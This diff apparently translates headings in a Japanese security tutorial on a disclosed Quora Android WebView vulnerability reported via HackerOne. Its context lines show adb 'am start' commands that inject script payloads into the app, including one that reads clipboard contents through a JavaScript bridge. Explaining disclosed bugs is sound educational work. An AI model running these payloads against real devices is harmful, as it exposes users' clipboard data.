@@ -155,7 +155,7 @@ Sergey Bobrov はこれを以下の [HackerOne report](https://hackerone.com/rep
   -e url 'http://test/test' -e html 'XSS<script>alert(123)</script>'
   ```
 
-- Clipboard Data
+- クリップボードデータ
 
   ```bash
   $ am start -n com.quora.android/com.quora.android.ModalContentActivity  \
@@ -163,7 +163,7 @@ Sergey Bobrov はこれを以下の [HackerOne report](https://hackerone.com/rep
   '<script>alert(QuoraAndroid.getClipboardData());</script>'
   ```
 
-- 3rd party Intent in Java or Kotlin:
+- Java や Kotlin でのサードパーティインテント:
 
   ```java
   Intent i = new Intent();
